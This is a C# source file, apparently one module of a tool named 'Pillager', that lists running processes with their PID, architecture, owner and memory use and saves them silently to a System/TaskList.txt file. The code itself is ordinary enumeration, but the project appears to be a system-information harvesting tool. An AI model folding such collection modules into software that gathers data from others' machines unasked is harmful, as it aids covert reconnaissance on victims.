using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Pillager.Helper;
using System.Diagnostics;

namespace Pillager.SystemInfos
{
    internal class TaskList : ICommandOnce
    {
        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            List<string[]> lines = new List<string[]>();
            foreach (Process process in Process.GetProcesses())
            {
                string architecture;
                try
                {
                    Native.IsWow64Process(process.Handle, out var isWow64Process);
                    architecture = isWow64Process ? "x64" : "x86";
                }
                catch
                {
                    architecture = "N/A";
                }
                var workingSet = (int)(process.WorkingSet64 / 1000000);

                string userName = Methods.GetProcessUserName(process);

                lines.Add(
                    new string[] {process.ProcessName,
                        process.Id.ToString(),
                        architecture,
                        userName,
                        Convert.ToString(workingSet)
                    }
                );

            }
            string[][] linesArray = lines.ToArray();

            Comparer<int> comparer = Comparer<int>.Default;
            Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
            string[] headerArray = { "ProcessName", "PID", "Arch", "UserName", "MemUsage" };
            sb.AppendLine(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
            foreach (string[] line in linesArray)
            {
                sb.AppendLine(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
            }
            return sb.ToString();
        }
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                string result = GetInfo();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "TaskList.txt"), result, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}